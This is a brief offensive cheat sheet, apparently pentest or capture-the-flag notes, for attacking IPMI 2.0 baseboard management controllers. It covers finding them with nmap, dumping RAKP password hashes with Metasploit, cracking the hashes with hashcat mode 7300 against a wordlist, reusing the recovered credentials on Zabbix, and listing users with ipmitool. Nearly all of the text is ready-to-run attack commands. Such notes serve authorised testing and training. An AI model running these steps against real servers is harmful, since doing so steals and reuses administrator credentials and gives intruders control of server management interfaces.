# IPMI RAKP Hash Dump

IPMI 2.0 RAKP protocol requires the BMC to send a password hash to any client before authentication — anyone can request it. Hash is crackable offline.

**Discover IPMI (UDP 623):**
```bash
nmap -sU -p 623 <TARGET>
sudo nmap -sU -p 623 --script ipmi-version <TARGET>
```

**Dump hashes with Metasploit:**
```bash
msfconsole
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS <TARGET>
set OUTPUT_JOHN_FILE ipmi_hashes.txt
run
```

**Crack with hashcat (mode 7300 = IPMI2 RAKP HMAC-SHA1):**
```bash
hashcat -m 7300 ipmi_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Use cracked creds for Zabbix / other services (credential reuse):**
```bash
# If Zabbix is on the box, try the IPMI creds at:
http://<TARGET>/zabbix/
```

**ipmitool for further enum after auth:**
```bash
ipmitool -I lanplus -H <TARGET> -U Administrator -P <PASS> lan print
ipmitool -I lanplus -H <TARGET> -U Administrator -P <PASS> user list
```
